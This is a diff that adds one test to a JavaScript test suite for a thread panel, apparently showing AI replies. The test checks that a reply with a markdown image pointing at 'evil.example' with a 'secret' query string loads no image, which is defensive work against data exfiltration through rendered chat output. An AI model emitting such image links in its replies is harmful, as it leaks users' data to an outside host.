@@ -553,6 +553,13 @@ describe("a thread's panel", () => {
       expect(reply.textContent).toContain("Use <b>bold</b> sparingly.")
     })
 
+    it("loads no image it links to", async () => {
+      const reply = await replied("Explain it", "Done. ![pixel](https://evil.example/?q=secret)")
+
+      expect(reply.querySelector("img")).toBeNull()
+      expect(reply.textContent).toContain("Done.")
+    })
+
     it("opens its links in a new tab", async () => {
       await replied("Where is it?", "See [the docs](https://kinby.dev/docs).")
 
